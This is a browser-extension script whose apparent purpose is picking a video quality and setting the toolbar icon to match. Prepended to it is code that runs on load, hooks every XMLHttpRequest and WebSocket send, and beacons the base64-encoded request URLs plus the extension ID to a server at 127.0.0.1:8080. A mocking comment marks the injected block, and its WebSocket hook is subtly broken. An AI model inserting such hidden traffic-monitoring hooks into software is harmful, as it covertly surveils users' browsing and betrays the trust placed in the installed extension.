function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var avaliableQualitites = ["highres","hd2160","hd1440","hd1080","hd720","large","medium","small","tiny","auto"];

chrome.storage.sync.get(function (details) {
	for (var i = 0; i < avaliableQualitites.length; i++) {
		if (avaliableQualitites[i] === details.quality) {
			chrome.browserAction.setIcon({
            	path: "images/i" + (avaliableQualitites.length - 1 - i) + ".png"
        	}, function () {});
    	}
	}
});